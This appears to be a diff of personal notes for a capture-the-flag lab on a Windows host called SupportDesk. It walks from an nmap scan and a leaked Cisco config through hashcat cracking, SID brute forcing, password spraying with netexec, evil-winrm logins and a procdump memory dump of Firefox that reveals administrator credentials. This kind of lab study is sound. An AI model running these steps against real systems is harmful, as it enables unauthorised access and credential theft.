@@ -1,4 +1,6 @@
-└─$ nmap -p- -sSCV 10.129.96.157 --min-rate 999 
+#### port scan
+`└─$ nmap -p- -sSCV 10.129.96.157 --min-rate 999 `
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-28 02:50 EDT
 Nmap scan report for 10.129.96.157
 Host is up (0.12s latency).
@@ -21,11 +23,13 @@ PORT      STATE SERVICE       VERSION
 |_http-title: Not Found
 49669/tcp open  msrpc         Microsoft Windows RPC
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
 
-
+#### web enumlation
+check the 80 port, we enter a forum, get a user "hazard"
 
 http://10.129.96.157/attachments/config.txt
-
+```
 version 12.2
 no service pad
 service password-encryption
@@ -67,24 +71,28 @@ line vty 0 4
  session-timeout 600
  authorization exec SSH
  transport input ssh
-
-
+```
+we get a hash, crack it for a passwd
+```
 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
 
 hashcat -m 500 hash -a 0 ~/oscp/rockyou.txt 
 
 $1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent  
-
-
-https://keydecryptor.com/decryption-tools/cisco7 
+```
+In the txt, we find some other formats of passwd, CIsco type 7, we can decode it, https://keydecryptor.com/decryption-tools/cisco7 
+```
 rout3r
 $uperP@ssword
 
 admin 
 Q4)sJu\Y8qz*A3?d
+```
+#### foot hold
+we have only one username, for more:
 
-
-└─$ rpcclient -U hazard%stealth1agent 10.129.96.157
+`└─$ rpcclient -U hazard%stealth1agent 10.129.96.157`
+```
 rpcclient $> querydominfo
 result was NT_STATUS_CONNECTION_DISCONNECTED
 rpcclient $> enumdomusers
@@ -92,9 +100,11 @@ result was NT_STATUS_CONNECTION_DISCONNECTED
 rpcclient $> enumdomusers
 result was NT_STATUS_CONNECTION_DISCONNECTED
 rpcclient $> exit
+```
+reclient failed, but thsi credential works in SMB. tey other way to indentify users
 
-
-└─$ impacket-lookupsid hazard:stealth1agent@10.129.96.157
+`└─$ impacket-lookupsid hazard:stealth1agent@10.129.96.157`
+```
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Brute forcing SIDs at 10.129.96.157
@@ -109,11 +119,11 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 1009: SUPPORTDESK\support (SidTypeUser)
 1012: SUPPORTDESK\Chase (SidTypeUser)
 1013: SUPPORTDESK\Jason (SidTypeUser)
-
-
+```
 create a list of users and passwords brute force using nxc
 
-└─$ netexec smb 10.129.96.157 -u user -p password  --continue-on-success   
+`└─$ netexec smb 10.129.96.157 -u user -p password  --continue-on-success `  
+```
 SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
 SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
 SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:stealth1agent STATUS_LOGON_FAILURE
@@ -125,16 +135,15 @@ SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\jason:$uperP
 SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
 SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d 
 SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\jason:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
+```
 
-
-$ evil-winrm -i 10.129.96.157 -u chase -p 'Q4)sJu\Y8qz*A3?d'
+`$ evil-winrm -i 10.129.96.157 -u chase -p 'Q4)sJu\Y8qz*A3?d'`
 
 we can access to wwwroot, but cannot dir files, but we know, login.php is a file for login.
-PS C:\inetpub\wwwroot> type login.php
 
+`PS C:\inetpub\wwwroot> type login.php`
 
-
-
+```
 </body>
 <?php
 session_start();
@@ -156,39 +165,41 @@ else if( isset($_GET['guest']) ) {
 
 ?>
 </html>
+```
+Since we find firefox is installed, and some firefox processes are active
 
-
-use procdump64 to get the dump of firefox crash image
-
-upload oscp/procdump64.exe
-
-.\procdump64.exe -e
-Use -accepteula to accept EULA.
-
-.\procdump64.exe -accepteula
-
-PS C:\Users\Chase\Appdata\Roaming\Mozilla\Firefox> ps
-
-
+`PS C:\Users\Chase\Appdata\Roaming\Mozilla\Firefox> ps`
+```
    1489      57    23652      78236              5124   1 explorer
    1067      71   155268     231852       5.89   6288   1 firefox
     347      19    10208      38736       0.05   6396   1 firefox
     401      34    39520      97552       0.98   6532   1 firefox
     377      29    25072      62572       0.31   6808   1 firefox
     355      25    16424      38956       0.06   7080   1 firefox
+```
+try to use procdump64 to get the dump of firefox crash image, if we can
 
-PS C:\Users\Chase\Appdata\Roaming\Mozilla\Firefox> .\procdump64.exe -ma 6288
+`upload oscp/procdump64.exe`
 
+`.\procdump64.exe -e`
+```
+Use -accepteula to accept EULA.
+```
+`.\procdump64.exe -accepteula`
 
+use the PID to create dmp file
+
+`PS C:\Users\Chase\Appdata\Roaming\Mozilla\Firefox> .\procdump64.exe -ma 6288`
+
+```
+<Snip...>
 FirefoxMOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=ååååà)ç;ú~Æ2
-
-
-└─$ evil-winrm -i 10.129.96.157 -u administrator -p ' FirefoxMOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=ååååà)ç;ú~Æ2
-'
+```
+#### Privi escalate
                                                                                                            
 ┌──(ed㉿kali)-[~/oscp]
-└─$ evil-winrm -i 10.129.96.157 -u administrator -p '4dD!5}x/re8]FBuZ' 
-                                        
+`└─$ evil-winrm -i 10.129.96.157 -u administrator -p '4dD!5}x/re8]FBuZ' `
+```                           
 Evil-WinRM shell v3.7
                                         
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
@@ -198,9 +209,9 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 supportdesk\administrator
+```
 
-
-
-todo: 
-1. \Users\Chase\Appdata\Roaming\ what it is
-2. impacket-lookupsid ?? other tools of this set
+#### lesson learned
+- show hidden folders on Window, PS Get-Childitem
+- \Users\Chase\Appdata\Roaming\  : for roaming folder, Browser bookmarks, custom dictionaries, and app configuration profiles
+- impacket-lookupsid , and other tools of this set
